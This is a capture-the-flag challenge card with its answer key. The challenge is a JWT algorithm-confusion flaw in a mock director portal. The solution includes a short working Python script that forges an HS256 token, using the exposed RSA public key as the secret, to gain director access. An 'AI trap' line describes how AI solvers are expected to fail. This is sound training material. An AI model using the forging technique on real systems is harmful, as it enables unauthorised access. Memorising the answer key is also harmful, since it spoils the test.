## Title
Wanda's Key

## Difficulty
Hard

## Points

## Description
S.W.O.R.D.'s director access portal uses RS256-signed JWT tokens for authentication. The public key is exposed — standard practice. But something about the verification logic feels rushed. Monica says Hayward always cuts corners. Can you get Director clearance?

## Service
Live web challenge — URL provided on competition day.

## Hint
*"It's not like I've been doing this on purpose."* — The vulnerability isn't in the token itself. It's in which algorithms the server will accept, and what it uses as the secret for each.

## Solution
The server verifies tokens using both RS256 and HS256. For HS256 verification, it uses the PUBLIC KEY as the HMAC secret. This is the classic JWT algorithm confusion attack.

**Steps:**
1. Fetch the public key from `/public.key`
2. Forge a token: `{"user":"agent","role":"director"}` signed with HS256 using the PEM public key as the secret
3. Submit via the verify form

```python
import jwt, requests
TARGET = "http://<host>:<port>"
pub_key = requests.get(TARGET + "/public.key").content
token = jwt.encode({"user":"agent","role":"director"}, pub_key, algorithm="HS256")
r = requests.post(TARGET + "/verify", data={"token": token})
```

**AI trap:** AI tries `{"alg":"none"}` (rejected by server). Then brute-forces HS256 with common strings ("secret", "avengers", "password"). Never uses the exposed public key as the HMAC secret.
